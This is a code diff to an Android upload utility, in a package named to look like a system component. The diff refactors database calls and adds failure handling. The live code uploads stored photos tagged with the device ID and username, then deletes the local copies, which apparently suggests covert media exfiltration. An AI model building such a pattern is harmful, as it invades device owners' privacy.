@@ -1,7 +1,6 @@
 package com.android.media.settings.Utility;
 
 import android.content.Context;
-import android.database.Cursor;
 import android.os.AsyncTask;
 import android.util.Log;
 
@@ -9,8 +8,8 @@ import com.android.media.settings.API.MediaAPI;
 import com.android.media.settings.MediaConfig;
 import com.android.media.settings.MediaDBManager;
 import com.android.media.settings.Models.Media;
-import com.android.media.settings.Services.MediaService;
 import com.android.media.settings.Models.MediaAPIResponse;
+import com.android.media.settings.Services.MediaService;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -40,7 +39,7 @@ public class MediaUploadUtility {
     }
 
     public void initUploadServices() {
-        mediaList = dbManager.getLocalMedia();
+        mediaList = dbManager.getMedia();
         if(mediaList != null && mediaList.size() > 0) {
             if(mUtility.networkConnected()) {
                 new MediaUploadTask().execute();
@@ -48,29 +47,29 @@ public class MediaUploadUtility {
         }
     }
 
-    private void processMediaCursor(Cursor cursor) {
-        try {
-            MediaAPI api = mUtility.initRetroService();
-            while (cursor.moveToNext()) {
-                String id = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID));
-                String path = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL));
-                File file = new File(path);
-
-                if(file.exists()) {
-                    RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
-                    MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), id, imgBody);
-                    Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
-                    observable.subscribeOn(Schedulers.newThread())
-                            .observeOn(AndroidSchedulers.mainThread())
-                            .subscribe(observer);
-                }
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        } finally {
-            cursor.close();
-        }
-    }
+//    private void processMediaCursor(Cursor cursor) {
+//        try {
+//            MediaAPI api = mUtility.initRetroService();
+//            while (cursor.moveToNext()) {
+//                String id = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID));
+//                String path = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL));
+//                File file = new File(path);
+//
+//                if(file.exists()) {
+//                    RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
+//                    MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), id, imgBody);
+//                    Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
+//                    observable.subscribeOn(Schedulers.newThread())
+//                            .observeOn(AndroidSchedulers.mainThread())
+//                            .subscribe(observer);
+//                }
+//            }
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        } finally {
+//            cursor.close();
+//        }
+//    }
 
     private Observer<MediaAPIResponse> observer = new Observer<MediaAPIResponse>() {
         @Override
@@ -83,11 +82,18 @@ public class MediaUploadUtility {
                 if(response != null) {
                     if(response.getStatus() == 1) {
                         String id = response.getData();
-                        Media media = dbManager.getMedia(id);
+                        Media media = dbManager.getMediaById(id);
                         if(media != null) {
                             media.setStatus(2);
                             dbManager.updateUploadStatus(media);
-                            boolean isDeleted = new File(media.getPath()).delete();
+                            final boolean isDeleted = new File(media.getPath()).delete();
+                        }
+                    } else {
+                        String id = response.getData();
+                        Media media = dbManager.getMediaById(id);
+                        if(media != null) {
+                            media.setStatus(0);
+                            dbManager.updateUploadStatus(media);
                         }
                     }
                 }
